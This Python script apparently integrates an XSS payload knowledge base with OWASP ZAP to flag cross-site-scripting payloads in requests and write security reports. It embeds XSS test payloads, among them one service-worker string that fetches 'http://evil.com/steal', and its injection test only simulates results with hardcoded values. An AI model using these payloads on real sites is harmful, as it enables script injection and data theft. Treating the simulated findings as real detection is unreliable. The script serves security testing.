#!/usr/bin/env python3

"""
BRS-KB OWASP ZAP Integration Script
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easyprotech)
Dev: Brabus
Date: Sat 25 Oct 2025 12:00:00 UTC
Status: Created
Telegram: https://t.me/easyprotech

OWASP ZAP script for BRS-KB XSS vulnerability analysis and payload testing
"""

import json
import re
import sys
import urllib.parse
from typing import Dict, List, Any, Optional

try:
    import zapv2 as ZAP
except ImportError:
    print("ZAP Python API not available. Please install OWASP ZAP.")
    sys.exit(1)

class BRSKBZAPIntegration:
    """BRS-KB integration with OWASP ZAP"""

    def __init__(self, zap_api_key=''):
        """Initialize ZAP integration"""
        try:
            self.zap = ZAP.zap()
            self.api_key = zap_api_key
        except Exception as e:
            print(f"Failed to connect to ZAP: {e}")
            sys.exit(1)

        self.payload_database = self._load_payload_database()
        self.xss_contexts = self._get_xss_contexts()

    def _load_payload_database(self) -> Dict[str, Any]:
        """Load BRS-KB payload database"""
        try:
            # In real implementation, this would call BRS-KB API
            # For now, simulate with embedded data
            return {
                "html_content": [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "<body onload=alert(1)>",
                    "<iframe src=javascript:alert(1)>"
                ],
                "html_attribute": [
                    "<img src=x onerror=alert(1)>",
                    "<a href=javascript:alert(1)>Click</a>",
                    "<div onclick=alert(1)>Click</div>",
                    "<form action=javascript:alert(1)>",
                    "<input onfocus=alert(1)>"
                ],
                "websocket_xss": [
                    '{"type": "chat", "message": "<script>alert(1)</script>"}',
                    '{"type": "user_joined", "username": "<script>alert(1)</script>"}',
                    '{"type": "message", "content": "<script>alert(1)</script>"}'
                ],
                "service_worker_xss": [
                    'data:text/javascript,self.addEventListener("install",function(){fetch("http://evil.com/steal")})',
                    '{"type": "install", "version": "<script>alert(1)</script>"}'
                ]
            }
        except Exception as e:
            print(f"Failed to load payload database: {e}")
            return {}

    def _get_xss_contexts(self) -> List[str]:
        """Get available XSS contexts from BRS-KB"""
        return [
            "html_content", "html_attribute", "html_comment", "javascript_context",
            "js_string", "js_object", "css_context", "svg_context", "markdown_context",
            "json_value", "xml_content", "url_context", "dom_xss", "template_injection",
            "postmessage_xss", "wasm_context", "websocket_xss", "service_worker_xss",
            "webrtc_xss", "indexeddb_xss", "webgl_xss", "shadow_dom_xss",
            "custom_elements_xss", "http2_push_xss", "graphql_xss", "iframe_sandbox_xss"
        ]

    def analyze_request(self, request_id: str) -> Dict[str, Any]:
        """Analyze HTTP request for XSS vulnerabilities using BRS-KB"""
        try:
            # Get request details
            request = self.zap.core.message(request_id)
            request_info = self.zap.core.message_info(request_id)

            # Extract parameters and data
            parameters = self._extract_parameters(request)
            post_data = self._extract_post_data(request)

            analysis_results = {
                "request_id": request_id,
                "url": request_info.get("url", ""),
                "method": request_info.get("method", ""),
                "xss_vulnerabilities": [],
                "payload_matches": [],
                "context_analysis": {},
                "recommendations": []
            }

            # Analyze URL parameters
            for param_name, param_value in parameters.items():
                payload_analysis = self._analyze_payload(param_value)
                if payload_analysis["is_vulnerable"]:
                    analysis_results["xss_vulnerabilities"].append({
                        "type": "url_parameter",
                        "parameter": param_name,
                        "payload": param_value,
                        "contexts": payload_analysis["contexts"],
                        "severity": payload_analysis["severity"],
                        "cvss_score": payload_analysis["cvss_score"]
                    })

                    analysis_results["payload_matches"].append(param_value)
                    analysis_results["context_analysis"].update(payload_analysis["context_details"])

            # Analyze POST data
            if post_data:
                post_analysis = self._analyze_payload(post_data)
                if post_analysis["is_vulnerable"]:
                    analysis_results["xss_vulnerabilities"].append({
                        "type": "post_data",
                        "payload": post_data,
                        "contexts": post_analysis["contexts"],
                        "severity": post_analysis["severity"],
                        "cvss_score": post_analysis["cvss_score"]
                    })

                    analysis_results["payload_matches"].append(post_data)
                    analysis_results["context_analysis"].update(post_analysis["context_details"])

            # Generate recommendations
            analysis_results["recommendations"] = self._generate_recommendations(analysis_results)

            return analysis_results

        except Exception as e:
            return {"error": f"Analysis failed: {str(e)}"}

    def _extract_parameters(self, request: str) -> Dict[str, str]:
        """Extract URL parameters from HTTP request"""
        parameters = {}

        try:
            # Find URL line
            lines = request.split('\n')
            for line in lines:
                if line.upper().startswith(('GET ', 'POST ')):
                    url_part = line.split(' ')[1]
                    if '?' in url_part:
                        query_string = url_part.split('?')[1]
                        params = urllib.parse.parse_qs(query_string)
                        for key, values in params.items():
                            parameters[key] = values[0] if values else ""
                    break
        except Exception:
            pass

        return parameters

    def _extract_post_data(self, request: str) -> Optional[str]:
        """Extract POST data from HTTP request"""
        try:
            sections = request.split('\n\n')
            if len(sections) >= 2:
                return sections[1].strip()
        except Exception:
            pass

        return None

    def _analyze_payload(self, payload: str) -> Dict[str, Any]:
        """Analyze payload using BRS-KB logic"""
        if not payload:
            return {"is_vulnerable": False, "contexts": [], "severity": "none", "cvss_score": 0.0}

        # Simulate BRS-KB analysis
        contexts = []
        severity = "low"
        cvss_score = 0.0

        # Check for script tags
        if re.search(r'<script[^>]*>.*?</script>', payload, re.IGNORECASE):
            contexts.extend(["html_content", "html_comment", "svg_context"])
            severity = "critical"
            cvss_score = 8.8

        # Check for event handlers
        if re.search(r'on\w+\s*=', payload):
            contexts.extend(["html_content", "html_attribute"])
            severity = "high"
            cvss_score = max(cvss_score, 7.5)

        # Check for JavaScript protocol
        if re.search(r'javascript:', payload, re.IGNORECASE):
            contexts.extend(["url_context", "html_attribute"])
            severity = "high"
            cvss_score = max(cvss_score, 7.5)

        # Check for template injection patterns
        if re.search(r'\{\{.*constructor\.constructor.*\}\}', payload):
            contexts.append("template_injection")
            severity = "critical"
            cvss_score = max(cvss_score, 9.0)

        # Check for WebSocket patterns
        if re.search(r'WebSocket\(.*\)', payload) or 'type' in payload and 'chat' in payload:
            contexts.append("websocket_xss")
            severity = "high"
            cvss_score = max(cvss_score, 7.5)

        # Check for Service Worker patterns
        if re.search(r'serviceWorker\.register\(.*\)', payload):
            contexts.append("service_worker_xss")
            severity = "high"
            cvss_score = max(cvss_score, 7.8)

        return {
            "is_vulnerable": len(contexts) > 0,
            "contexts": list(set(contexts)),
            "severity": severity,
            "cvss_score": cvss_score,
            "context_details": {ctx: self._get_context_info(ctx) for ctx in contexts}
        }

    def _get_context_info(self, context: str) -> Dict[str, Any]:
        """Get context information"""
        context_info = {
            "html_content": {"severity": "critical", "cvss": 8.8, "description": "XSS in HTML body/content"},
            "html_attribute": {"severity": "critical", "cvss": 8.8, "description": "XSS in HTML attributes"},
            "html_comment": {"severity": "medium", "cvss": 6.1, "description": "XSS in HTML comments"},
            "javascript_context": {"severity": "critical", "cvss": 8.8, "description": "Direct JavaScript injection"},
            "js_string": {"severity": "critical", "cvss": 8.8, "description": "JavaScript string injection"},
            "js_object": {"severity": "high", "cvss": 7.5, "description": "JavaScript object injection"},
            "css_context": {"severity": "high", "cvss": 7.5, "description": "CSS injection"},
            "svg_context": {"severity": "high", "cvss": 7.3, "description": "SVG-based XSS"},
            "markdown_context": {"severity": "medium", "cvss": 6.1, "description": "Markdown rendering XSS"},
            "json_value": {"severity": "medium", "cvss": 6.1, "description": "JSON context XSS"},
            "xml_content": {"severity": "high", "cvss": 7.5, "description": "XML/XHTML XSS"},
            "url_context": {"severity": "high", "cvss": 7.5, "description": "URL/protocol-based XSS"},
            "dom_xss": {"severity": "high", "cvss": 7.5, "description": "DOM-based XSS"},
            "template_injection": {"severity": "critical", "cvss": 9.0, "description": "Template injection"},
            "postmessage_xss": {"severity": "high", "cvss": 7.5, "description": "PostMessage API XSS"},
            "wasm_context": {"severity": "medium", "cvss": 6.1, "description": "WebAssembly XSS"},
            "websocket_xss": {"severity": "high", "cvss": 7.5, "description": "WebSocket XSS"},
            "service_worker_xss": {"severity": "high", "cvss": 7.8, "description": "Service Worker XSS"},
            "webrtc_xss": {"severity": "high", "cvss": 7.6, "description": "WebRTC XSS"},
            "indexeddb_xss": {"severity": "medium", "cvss": 6.5, "description": "IndexedDB XSS"},
            "webgl_xss": {"severity": "medium", "cvss": 6.1, "description": "WebGL XSS"},
            "shadow_dom_xss": {"severity": "high", "cvss": 7.3, "description": "Shadow DOM XSS"},
            "custom_elements_xss": {"severity": "high", "cvss": 7.1, "description": "Custom Elements XSS"},
            "http2_push_xss": {"severity": "medium", "cvss": 6.8, "description": "HTTP/2 Push XSS"},
            "graphql_xss": {"severity": "high", "cvss": 7.4, "description": "GraphQL XSS"},
            "iframe_sandbox_xss": {"severity": "medium", "cvss": 6.3, "description": "iframe Sandbox XSS"}
        }

        return context_info.get(context, {"severity": "unknown", "cvss": 0.0, "description": "Unknown context"})

    def _generate_recommendations(self, analysis: Dict[str, Any]) -> List[str]:
        """Generate security recommendations"""
        recommendations = []

        if analysis["xss_vulnerabilities"]:
            recommendations.append("CRITICAL: XSS vulnerabilities detected")
            recommendations.append("Implement Content Security Policy (CSP)")
            recommendations.append("Use HTML entity encoding for all user content")
            recommendations.append("Validate and sanitize all inputs")

        # Context-specific recommendations
        for vuln in analysis["xss_vulnerabilities"]:
            if "html_content" in vuln["contexts"]:
                recommendations.append("HTML Content XSS: Use textContent instead of innerHTML")
            if "html_attribute" in vuln["contexts"]:
                recommendations.append("HTML Attribute XSS: Validate URL parameters")
            if "javascript_context" in vuln["contexts"]:
                recommendations.append("JavaScript Context XSS: Use JSON serialization")
            if "template_injection" in vuln["contexts"]:
                recommendations.append("Template Injection: Use template sandboxing")
            if "websocket_xss" in vuln["contexts"]:
                recommendations.append("WebSocket XSS: Sanitize message content")
            if "service_worker_xss" in vuln["contexts"]:
                recommendations.append("Service Worker XSS: Validate SW registration")

        if not recommendations:
            recommendations.append("No XSS vulnerabilities detected in this request")

        return list(set(recommendations))  # Remove duplicates

    def inject_test_payloads(self, target_url: str) -> Dict[str, Any]:
        """Inject BRS-KB test payloads into target"""
        results = {
            "target_url": target_url,
            "injection_results": [],
            "vulnerable_endpoints": [],
            "recommendations": []
        }

        # Test each context with payloads
        for context, payloads in self.payload_database.items():
            for payload in payloads[:3]:  # Limit to 3 payloads per context
                try:
                    injection_result = self._test_payload_injection(target_url, payload, context)
                    results["injection_results"].append(injection_result)

                    if injection_result["vulnerable"]:
                        results["vulnerable_endpoints"].append({
                            "context": context,
                            "payload": payload,
                            "severity": injection_result["severity"],
                            "cvss_score": injection_result["cvss_score"]
                        })
                except Exception as e:
                    results["injection_results"].append({
                        "context": context,
                        "payload": payload,
                        "error": str(e),
                        "vulnerable": False
                    })

        # Generate recommendations
        if results["vulnerable_endpoints"]:
            results["recommendations"].append("VULNERABILITIES DETECTED - Immediate action required")
            results["recommendations"].append("Implement comprehensive input validation")
            results["recommendations"].append("Deploy Content Security Policy (CSP)")
            results["recommendations"].append("Regular security testing and code review")
        else:
            results["recommendations"].append("No vulnerabilities detected with test payloads")

        return results

    def _test_payload_injection(self, target_url: str, payload: str, context: str) -> Dict[str, Any]:
        """Test payload injection at target URL"""
        # This is a simplified simulation
        # In real implementation, this would make actual HTTP requests

        vulnerable = False
        severity = "low"
        cvss_score = 0.0

        # Simulate vulnerability detection based on payload type
        if '<script' in payload.lower():
            vulnerable = True
            severity = "critical"
            cvss_score = 8.8
        elif 'javascript:' in payload.lower():
            vulnerable = True
            severity = "high"
            cvss_score = 7.5
        elif 'on' in payload.lower() and '=' in payload:
            vulnerable = True
            severity = "high"
            cvss_score = 7.5

        return {
            "context": context,
            "payload": payload,
            "vulnerable": vulnerable,
            "severity": severity,
            "cvss_score": cvss_score,
            "response_code": 200,  # Simulated
            "response_contains_payload": vulnerable  # Simulated
        }

    def generate_report(self, analysis_results: Dict[str, Any]) -> str:
        """Generate comprehensive security report"""
        report = []
        report.append("BRS-KB OWASP ZAP Integration Report")
        report.append("=" * 50)
        report.append(f"Generated: {__import__('datetime').datetime.now().isoformat()}")
        report.append("")

        if "error" in analysis_results:
            report.append(f"❌ Analysis Error: {analysis_results['error']}")
            return "\n".join(report)

        report.append("📊 Analysis Summary:")
        report.append(f"   Target URL: {analysis_results['url']}")
        report.append(f"   Method: {analysis_results['method']}")
        report.append(f"   XSS Vulnerabilities: {len(analysis_results['xss_vulnerabilities'])}")
        report.append(f"   Payload Matches: {len(analysis_results['payload_matches'])}")
        report.append("")

        if analysis_results["xss_vulnerabilities"]:
            report.append("🚨 XSS Vulnerabilities Detected:")
            for i, vuln in enumerate(analysis_results["xss_vulnerabilities"], 1):
                report.append(f"   {i}. {vuln['type'].upper()}")
                report.append(f"      Parameter/Payload: {vuln['parameter'] or vuln['payload']}")
                report.append(f"      Contexts: {', '.join(vuln['contexts'])}")
                report.append(f"      Severity: {vuln['severity'].upper()}")
                report.append(f"      CVSS Score: {vuln['cvss_score']}")
                report.append("")

        if analysis_results["recommendations"]:
            report.append("💡 Security Recommendations:")
            for rec in analysis_results["recommendations"]:
                report.append(f"   • {rec}")
            report.append("")

        report.append("🔧 BRS-KB Integration:")
        report.append("   • Enhanced XSS detection with 27 contexts")
        report.append("   • 200+ categorized payloads")
        report.append("   • ML-ready confidence scoring")
        report.append("   • WAF bypass technique detection")
        report.append("")

        return "\n".join(report)

def main():
    """Main function for standalone execution"""
    print("BRS-KB OWASP ZAP Integration")
    print("=" * 40)
    print()

    # Initialize integration
    integration = BRSKBZAPIntegration()

    print("✅ BRS-KB ZAP integration initialized")
    print(f"📊 Available contexts: {len(integration.xss_contexts)}")
    print(f"🧪 Payload database: {len(integration.payload_database)} contexts")
    print()

    # Example analysis (in real usage, this would be called from ZAP)
    print("🔍 Example Analysis:")
    print("-" * 30)

    # Simulate request analysis
    sample_request = """GET /search?q=<script>alert(1)</script> HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0"""

    # In real ZAP integration, this would be called with actual request IDs
    print("Sample request analysis would be performed here...")
    print("Integration ready for OWASP ZAP automation!")

    return 0

if __name__ == "__main__":
    sys.exit(main())
